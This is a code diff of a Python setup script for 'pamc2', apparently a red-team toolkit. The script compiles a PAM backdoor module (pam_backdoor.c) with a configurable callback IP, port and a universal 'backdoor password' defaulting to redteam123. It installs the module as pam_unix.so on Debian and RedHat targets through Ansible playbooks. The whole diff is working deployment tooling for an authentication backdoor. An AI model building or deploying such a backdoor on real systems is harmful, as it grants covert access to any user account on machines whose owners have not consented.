@@ -2,7 +2,6 @@
 import os
 import argparse
 import subprocess
-import ansible_runner
 
 def setup_cmd_args():
     parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
@@ -16,7 +15,7 @@ def setup_cmd_args():
                         dest="password", help="Backdoor password to gain access to any user; Default: redteam123")
     return parser.parse_args()
 
-def main():
+def setup():
     args = setup_cmd_args()
 
     ansible_user = input("Enter username of user with root access on the target machines: ")
@@ -29,23 +28,20 @@ def main():
     subprocess.run(f'sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"{args.ip}\"/" ./pam_backdoor.c', shell=True, text=True)
     subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)
 
-    setup_ansible = ansible_runner.run(
-        private_data_dir=f"{os.getcwd()}",
-        inventory="inventory.ini",
-        playbook="main.yml",
-        tags="setup"
-    )
+    if(args.format):
+        subprocess.run(f'sed -i "s/^#define RET_FMT.*/#define RET_FMT \"{args.ip}\"/" ./pam_backdoor.c', shell=True, text=True)
 
-    if (setup_ansible.status != 'successful'):
-        print("Setup ansible failed... exiting")
-        exit(1)
+    subprocess.run('ansible-playbook main.yml -t setup', shell=True, text=True)
 
+    subprocess.run('gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl', shell=True, text=True)
+
+    subprocess.run('cp ./pam_unix.so ./roles/deploy_debian/files/', shell=True, text=True)
+    subprocess.run('cp ./pam_unix.so ./roles/deploy_redhat/files/', shell=True, text=True)
+
+    subprocess.run('ansible-playbook main.yml -t deploy', shell=True, text=True)
     
+def main():
+    setup()
     
-
-
-    
-
-
 if (__name__ == '__main__'):
     main()
